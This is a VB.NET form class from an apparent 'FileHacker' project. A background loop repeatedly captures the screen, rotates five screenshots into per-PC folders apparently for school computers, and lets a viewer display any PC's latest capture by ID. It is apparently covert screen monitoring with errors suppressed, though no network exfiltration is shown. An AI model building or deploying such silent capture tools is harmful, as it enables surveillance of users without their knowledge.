Imports System.ComponentModel
Imports System.IO
Imports FHCodePack
Imports System.Drawing.Imaging

Public Class FileHackerAdditionalTools
    Private Sub FileHackerAdditionalTools_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Wtimer.Start()
    End Sub
    Public Function GetWorkers(sender As Object) As BackgroundWorker()
        Dim easy As New BackgroundWorker
        AddHandler easy.DoWork,
            Sub(sender_ As Object, e As DoWorkEventArgs)
                While True
                    Try
                        MoveFiles()
                        CaptureScreen.CaptureScreen.Save(FHTools.GetFHPath("ScreenShot", SchoolPCChecker.GetPCName, "SS5.png"), ImageFormat.Png)
                    Catch
                    End Try
                End While
            End Sub
        Return {easy}
    End Function
    Private Sub MoveFiles()
        MakeFolder(FHTools.GetFHPath("ScreenShot"))
        MakeFolder(FHTools.GetFHPath("ScreenShot", SchoolPCChecker.GetPCName))
        If File.Exists(FHTools.GetFHPath("ScreenShot", SchoolPCChecker.GetPCID, "SS1.png")) Then
            File.Delete(FHTools.GetFHPath("ScreenShot", SchoolPCChecker.GetPCID, "SS1.png"))
        End If
        If File.Exists(FHTools.GetFHPath("ScreenShot", SchoolPCChecker.GetPCID, "SS2.png")) Then
            File.Move(FHTools.GetFHPath("ScreenShot", SchoolPCChecker.GetPCID, "SS2.png"), FHTools.GetFHPath("ScreenShot", SchoolPCChecker.GetPCName, "SS1.png"))
        End If
        If File.Exists(FHTools.GetFHPath("ScreenShot", SchoolPCChecker.GetPCID, "SS3.png")) Then
            File.Move(FHTools.GetFHPath("ScreenShot", SchoolPCChecker.GetPCID, "SS3.png"), FHTools.GetFHPath("ScreenShot", SchoolPCChecker.GetPCName, "SS2.png"))
        End If
        If File.Exists(FHTools.GetFHPath("ScreenShot", SchoolPCChecker.GetPCID, "SS4.png")) Then
            File.Move(FHTools.GetFHPath("ScreenShot", SchoolPCChecker.GetPCID, "SS4.png"), FHTools.GetFHPath("ScreenShot", SchoolPCChecker.GetPCName, "SS3.png"))
        End If
        If File.Exists(FHTools.GetFHPath("ScreenShot", SchoolPCChecker.GetPCID, "SS5.png")) Then
            File.Move(FHTools.GetFHPath("ScreenShot", SchoolPCChecker.GetPCID, "SS5.png"), FHTools.GetFHPath("ScreenShot", SchoolPCChecker.GetPCName, "SS4.png"))
        End If
    End Sub
    Public Shared Sub MakeFolder(path As String)
        If Not Directory.Exists(path) Then
            Directory.CreateDirectory(path)
        End If
    End Sub
    Dim temp As Integer = 0
    Private Sub Wtimer_Tick(sender As Object, e As EventArgs) Handles Wtimer.Tick
        If temp = 0 Then Return
        Dim img As Image
        Try
            Dim ms = New MemoryStream(File.ReadAllBytes(FHTools.GetFHPath("ScreenShot", temp, "SS5.png")))
            img = Image.FromStream(ms)
        Catch ex As Exception
            img = My.Resources.CouldNotOpen
        End Try
        SSPanel.Image = img
    End Sub
    Private Sub ShowSS_Click(sender As Object, e As EventArgs) Handles ShowSS.Click
        temp = PCID.Value
    End Sub
End Class
